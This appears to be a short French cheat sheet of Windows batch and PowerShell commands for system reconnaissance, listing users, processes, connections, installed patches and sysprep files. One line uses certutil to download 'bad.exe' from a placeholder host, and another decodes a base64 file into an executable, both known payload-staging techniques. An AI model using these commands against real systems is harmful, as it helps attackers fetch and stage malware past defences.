<h2>Batch</h2>
systeminfo → Obtenir des renseignements sur le système<\br>
net users [username] → Obtenir des renseignements sur les utilisateurs<\br>
tasklist → Lister les processus<\br>
netstat -ano → Liste des connexions tcp<\br>
dir sysprep /s /b → Trouver un fichier dans le repertoire courant et ses sous-dossiers<\br>
wmic qfe list → Lister les patch installés (KB)<\br>
certutil.exe -urlcache -split -f "http://site.com/bad.exe" bad.exe → wget en batch<\br>
certutil.exe -decode bad.txt bad.exe → base64 decode en cmd<\br>

<h2>Powershell</h2>
get-WmiObject -class Win32_Share
